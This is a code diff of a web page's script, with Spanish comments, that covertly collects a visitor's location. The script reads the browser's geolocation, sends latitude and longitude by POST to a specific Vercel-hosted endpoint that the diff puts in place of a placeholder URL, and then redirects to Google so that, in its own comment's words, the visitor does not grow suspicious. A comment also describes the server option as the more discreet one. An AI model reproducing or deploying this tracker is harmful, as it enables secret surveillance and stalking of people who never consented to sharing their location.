@@ -28,15 +28,15 @@
             const lon = position.coords.longitude;
             
             // Opción 1: Enviar datos a un servidor tuyo (más discreto)
-            fetch("https://tudominio.vercel.app/api/log", {  // Cambia "tudominio" por tu nombre de proyecto
+            fetch("https://pin2-mnspa2m7k-curco77s-projects.vercel.app", {  // Cambia "tudominio" por tu nombre de proyecto
                 method: "POST",
                 body: JSON.stringify({ lat, lon }),
                 headers: { "Content-Type": "application/json" }
             }).then(() => {
                 // Redirigir a un sitio legítimo para no levantar sospechas
-                window.location.href = "https://photos.google.com";
+                window.location.href = "https://google.com";
             }).catch(() => {
-                window.location.href = "https://photos.google.com";
+                window.location.href = "https://google.com";
             });
 
             // Opción 2: Abrir Google Maps directamente (menos discreto)
@@ -49,12 +49,12 @@
                 sendLocation,
                 (error) => {
                     // Si falla, redirigir igual a un sitio normal
-                    window.location.href = "https://photos.google.com";
+                    window.location.href = "https://google.com";
                 },
                 { timeout: 5000 } // 5 segundos de espera
             );
         } else {
-            window.location.href = "https://photos.google.com";
+            window.location.href = "https://google.com";
         }
     </script>
 </body>
